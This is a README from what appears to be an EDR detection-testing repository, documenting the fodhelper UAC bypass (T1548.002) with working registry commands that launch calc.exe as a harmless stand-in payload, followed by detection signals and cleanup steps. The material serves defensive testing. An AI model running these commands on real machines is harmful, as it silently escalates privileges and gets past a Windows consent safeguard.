# 08. UAC Bypass (via fodhelper)

[Portugues](../../08-bypass-uac-fodhelper/README.md) | **English**

**MITRE ATT&CK tactic:** Privilege Escalation
**ID:** T1548.002
**Expected severity:** High
**Needs admin:** No, that is the point
**Destructive:** No

## What it is for, from the attacker point of view

UAC, short for User Account Control, is that Windows window that asks whether you want to allow an app to make changes. It exists so that administrator actions require a confirmation.

Some native Windows programs, such as fodhelper.exe, rise to administrator without showing that window. The attacker abuses that behavior, using the registry, to run whatever they want already as admin, without clicking Yes and, often, starting from a regular user.

## Why it is dangerous

It is privilege escalation, that is, taking a limited access and turning it into full power on the machine, quietly, without the UAC confirmation. With admin privilege, almost every other technique in this repository becomes available.

## Analogy

It is like discovering that one specific back door never locks and has no camera. The regular employee, who could only enter the reception, now has access to the vault, without asking anyone for the key.

## What the script does

1. Creates a specific registry key that fodhelper.exe reads.
2. Runs fodhelper.exe, which would open the defined command without UAC.
3. Removes the registry key at the end.

The payload is harmless, opening the calculator. What raises the alert is the registry manipulation plus running fodhelper.

## Example commands

```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "C:\Windows\System32\calc.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f
fodhelper.exe
```

## What the EDR should detect

* Modification of the ms-settings Shell Open command key followed by fodhelper.exe.
* A known UAC bypass pattern, T1548.002, high severity.

## Prerequisites

* A regular user is enough, since it demonstrates the escalation.

## Cleanup

```cmd
reg delete "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f
```
